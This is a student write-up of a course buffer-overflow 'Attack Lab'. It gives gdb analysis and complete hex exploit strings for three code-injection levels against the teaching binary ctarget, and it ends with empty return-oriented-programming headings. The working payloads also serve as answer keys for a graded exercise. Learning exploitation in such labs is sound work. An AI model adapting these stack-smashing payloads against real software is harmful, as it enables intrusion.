# Attack Lab

## Introduction
Students are given binaries called ctarget and rtarget that have a buffer overflow bug. 
We are going to alter the behavior of the given targets via five increasingly difficult
exploits. The three attacks on ctarget use code injection. The two attacks on rtarget use
return-oriented programming.
The `src` folder includes all the files required to accomplish our 5 attacks:
```
README.txt:  A file describing the contents of the directory
ctarget:     An executable program vulnerable to code-injection attacks
rtarget:     An executable program vulnerable to return-oriented-programming attacks
cookie.txt:  An 8-digit hex code that you will use as a unique identifier in your attacks.
farm.c:      The source code of your target gadget farm, which you will use in generating
             return-oriented programming attacks.
hex2raw:     A utility to generate attack strings
```

Both CTARGET and RTARGET read strings from standard input.
```C
unsigned getbuf()
{
    char buf[BUFFER_SIZE];
    Gets(buf);
    return 1;
}
```

## Code Injection Attacks
Function `getbuf()` is called within `ctarget` by a function test having the following C code:
```C
void test()
{
    int val;
    val = getbuf();
    printf("No exploit. Getbuf returned 0x%x\n", val);
}
```
When `getbuf` executes its return statement, the program ordinarily resumes execution
within function test. We want to change this behavior by injecting code as the input
to `ctarget`.

### Level 1
Within the file `ctarget`, there is code for a function touch1 having the following C
representation:
```C
void touch1()
{
    vlevel = 1;    /* Part of validation protocol */
    printf("Touch1!: You called touch1()\n");
    validate(1);
    exit(0);
}
```
Our mission is to using a string input that can overflow the stack from `getbuf()` and
to redirect the program to `touch1()` when `getbuf()` returns.
Now let's go to the `src/` folder and analyze the disassembled code:
```bash
  unix > cd src
  unix > objdump -d ctarget > ctarget.d
```
Once opening the `ctarget.d` with an editor, we can see the `<test>` function starts
at address `0x401968`, `<getbuf>` starts at address `0x4017a8` and `<touch1>` starts
at address `0x4017c0`. So our level 1 task is to let `<getbuf>` return to address
`0x4017c0` instead of its original `0x401976`. We can do the analysis with `gdb`

```bash
  src > gdb ctarget
  (gdb) b test
  Breakpoint 1 at 0x401968: file visible.c, line 90.
  (gdb) r -q
  Starting program: ${Your_Root_Path}/03-Attack-Lab/src/ctarget -q
  Cookie: 0x59b997fa
  
  Breakpoint 1, test () at visible.c:90
  90      visible.c: No such file or directory.
  (gdb) layout asm
  (gdb) layout regs
```
The `-q` parameter is used to skip network related operations in `ctarget`, and
you can run `ctarget -h` to view the concrete description of all valid parameters.
Then we use `si` to monitor the program by instruction. We can see that every time
a `callq` is executed, the address of the next instruction of `callq` will be pushed
to the stack. And once the stack popped up from the called function, the `retq` will
pop the stack and go to the address that previously stored.
Let's monitor the instruction when `<test>` calls `<getbuf>`:
```
  0x401971   callq 0x4017a8 <getbuf>
  0x401976   mov   %eax,%edx
  ...
```
When we use `si` to arrive at instruction `0x401971`, the current stack is `rsp=0x5561dca8`.
And we further type a `si` in `gdb` console, we can see that the stack is now
`rsp=0x5561dca0`, and the value of it:
```
  (gdb) x/8xb 0x5561dca0
  0x5561dca0:     0x76    0x19    0x40    0x00    0x00    0x00    0x00    0x00  
```
Appearently, this is the original return address for `<getbuf>`. We are going to
use an input string to overwrite replace the stack frame at `0x5561dca0` by the address
of `<touch1>`. Next we will caluculate the size of bytes we need to inject in order
to reach `0x5561dca0`.
```
  <getbuf>
  0x4017a8:   sub    $0x28,%rsp
  0x4017ac:   mov    %rsp,%rdi
  0x4017af:   callq  401a40 <Gets>
  0x4017b4:   mov    $0x1,%eax
  0x4017b9:   add    $0x28,%rsp
  0x4017bd:   retq
```
According to the disassembled code, `<getbuf>` applies 40 bytes to stack, which means
that we need to first inject 40 bytes to occupy the stack of `<getbuf>` and then followed
by 8 bytes of address for `<touch1>` for the `retq` to redirect. One possible solution can
be
```
  00 00 00 00 00 00 00 00    /* stack space occupation */
  00 00 00 00 00 00 00 00    /* stack space occupation */
  00 00 00 00 00 00 00 00    /* stack space occupation */
  00 00 00 00 00 00 00 00    /* stack space occupation */
  00 00 00 00 00 00 00 00    /* stack space occupation */
  C0 17 40 00 00 00 00 00    /* the address of <touch1> */
```
Let's put the solution to file `ctarget.exploit.l1.txt`, and we can validate it by
executing from the following command `/src`
```
  03-Attack-Lab/src > cat ctarget.exploit.l1.txt | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch1!: You called touch1()
    Valid solution for level 1 with target ctarget
    PASS: ...
```

### Level 2
The task of level 2 is to redirect `<getbuf>` to `<touch2>`.
```c
void touch2(unsigned val)
{
    vlevel = 2; /* Part of validation protocol */
    if (val == cookie) {
        printf("Touch2!: You called touch2(0x%.8x)\n", val);
        validate(2);
    } else {
        printf("Misfire: You called touch2(0x%.8x)\n", val);
        fail(2);
    }
    exit(0);
}
```
Moreover, we must make it appear to `<touch2>` as if our cookie `0x59b997fa` is passed to it.
Note that the first argument to a function is passed in register `%rdi`, we have to redirect
the `<getbuf>` to an address storing code of the following:
```
  mov $0x59b997fa,%rdi  # assign cookie value to register rdi
  retq                  # go to <touch2>
```
Let's put the assembly code to a file `ctarget.code.l2.s` and obtain its machine code
```
  03-Attack-Lab/src > gcc -c ctarget.code.l2.s
  03-Attack-Lab/src > objdump -d ctarget.code.l2.o > ctarget.code.l2.d
  03-Attack-Lab/src > cat ctarget.code.l2.d
    ctarget.code.l2.o:     file format elf64-x86-64
    Disassembly of section .text:
    0000000000000000 <.text>:
       0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
       7:   c3                      retq
```
Following the address redirection in the previous task, we will first redirect `<getbuf>` to
the stack address where we put the machine code above. Here, we put this machine code to the
stack bottom of `<getbuf>`, which is `0x5561dc78`. Second, we will further append the
address of `<touch2>`, which is `0x4017ec` to the stack address that `retq` in our injected
code will head to. In this case, our solution for level 2 will be:
```
  48 c7 c7 fa 97 b9 59 c3    /* injected code */
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  78 dc 61 55 00 00 00 00    /* the address of injected code */
  ec 17 40 00 00 00 00 00    /* the address of <touch2> */
```
Put the above exploit to file `ctarget.exploit.l2.txt` and execute it:
```
  03-Attack-Lab/src > cat ctarget.exploit.l2.txt | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch2!: You called touch2(0x59b997fa)
    Valid solution for level 2 with target ctarget
    PASS: ...
```

### Level 3
Level 3 also involves a code injection attack, but passing a string as argument.
Within the file `ctarget` there is code for functions `<hexmatch>` and `<touch3>`
having the following C representations:
```c
/* Compare string to hex represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
    char cbuf[110];
    /* Make position of check string unpredictable */
    char *s = cbuf + random() % 100;
    sprintf(s, "%.8x", val);
    return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
    vlevel = 3; /* Part of validation protocol */
    if (hexmatch(cookie, sval)) {
        printf("Touch3!: You called touch3(\"%s\")\n", sval);
        validate(3);
    } else {
        printf("Misfire: You called touch3(\"%s\")\n", sval);
        fail(3);
    }
    exit(0);
}
```
We will redirect `<getbuf>` to `<touch3>`. This time, unlike passing the cookie
directly in Level 2, we will pass an address of string cookie `'59b997fa'`. Note
that `<touch3>` may occupy the stack space once used in `<getbuf>`, we are going
to put our string above the stack frame which used for `<touch3>` redirection.
According to the stack structure in Level 2, the address of this string is
`0x5561dcb0`. So our assembly code to inject is:
```asm
  mov $0x5561dcb0,%rdi    # set the address of cookie string to %rdi
  ret                     # go to <touch3>
```
Similar to Level 2, we use `gcc` and `objdump` to get the machine code
```bash
  03-Attack-Lab/src > gcc -c ctarget.code.l3.s
  03-Attack-Lab/src > objdump -d ctarget.code.l3.o > ctarget.code.l3.d
  03-Attack-Lab/src > cat ctarget.code.l3.d
    ctarget.code.l3.o:     file format elf64-x86-64
    Disassembly of section .text:
    0000000000000000 <.text>:
       0:   48 c7 c7 b0 dc 61 55    mov    $0x5561dcb0,%rdi
       7:   c3                      retq
```
Besides, we put the ascii encoded of cookie string `'59b997fa'` of 8 bytes to
the address `0x5561dcb0`, which is exactly the stack frame above the redirection
address to `<touch3>`. We arrive at our exploit for level 3:
```
  48 c7 c7 b0 dc 61 55 c3    /* injected code */
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  00 00 00 00 00 00 00 00
  78 dc 61 55 00 00 00 00    /* the address of injected code */
  fa 18 40 00 00 00 00 00    /* the address of <touch3> */
  35 39 62 39 39 37 66 61    /* the cookie string in ascii */
  00 00 00 00 00 00 00 00
```
Put the above exploit to file `ctarget.exploit.l3.txt` and execute it:
```
  03-Attack-Lab/src > cat ctarget.exploit.l3.txt | ./hex2raw | ./ctarget -q
    Cookie: 0x59b997fa
    Type string:Touch3!: You called touch3("59b997fa")
    Valid solution for level 3 with target ctarget
    PASS: ...
```

## Return-Oriented Programming

## Level 2

## Level 3
